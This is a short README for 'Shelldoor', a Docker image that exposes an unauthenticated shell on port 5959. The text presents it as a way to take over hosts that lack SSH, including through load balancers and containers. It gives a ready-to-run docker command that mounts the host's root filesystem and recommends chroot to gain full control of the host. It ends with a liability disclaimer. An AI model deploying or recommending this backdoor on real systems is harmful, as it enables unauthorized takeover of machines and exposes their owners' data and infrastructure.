## Shelldoor

Expose a port, listening with a reverse shell. Exposes the port 5959.

Useful for taking over a host which only has service ports exposed, but no SSH. Works well even when doing something like `attacker -> load balancer -> container ~> host`

## Run it

    docker run -it --rm -p 5959:5959 -v /:/host nicovillanueva/shelldoor:latest

The host's filesystem will be available in `/host` once you connect to the exposed shell. Doing a `chroot /host/` works wonders.

## Disclaimer

**I am by no means liable for any damage anyone could do with this. Do not use it on any system without previous consent.**
